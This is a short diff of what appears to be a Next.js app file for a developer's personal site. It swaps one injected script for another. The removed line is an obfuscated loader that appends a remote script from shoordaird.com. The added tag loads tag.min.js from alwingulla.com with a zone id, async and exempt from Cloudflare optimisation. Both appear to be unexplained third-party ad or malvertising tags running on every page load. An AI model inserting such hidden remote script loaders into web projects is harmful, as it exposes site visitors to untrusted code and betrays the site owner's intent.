@@ -69,7 +69,12 @@ function MyApp({ Component, pageProps }) {
         <title>Developer Julio</title>
       </Head>
       <body>
-      <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('shoordaird.com',7732189,document.createElement('script'))</script>
+        <script
+          src="https://alwingulla.com/88/tag.min.js"
+          data-zone="79405"
+          async
+          data-cfasync="false"
+        ></script>
       </body>
       <GlobalStyle />
       <Component {...pageProps} />
